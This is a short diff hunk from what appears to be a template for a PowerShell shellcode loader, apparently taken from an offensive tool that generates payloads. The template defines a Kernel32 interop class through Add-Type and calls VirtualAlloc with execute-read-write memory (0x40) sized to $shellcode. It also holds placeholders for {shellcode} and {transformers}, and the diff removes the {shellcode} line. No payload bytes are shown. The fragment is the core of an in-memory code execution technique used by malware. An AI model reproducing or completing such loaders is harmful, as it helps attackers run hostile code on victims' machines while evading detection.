@@ -32,7 +32,7 @@ public class Kernel32 {{
 
 Add-Type -TypeDefinition $Kernel32 -ErrorAction SilentlyContinue
 
-{shellcode}
+
 {transformers}
 
 $addr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
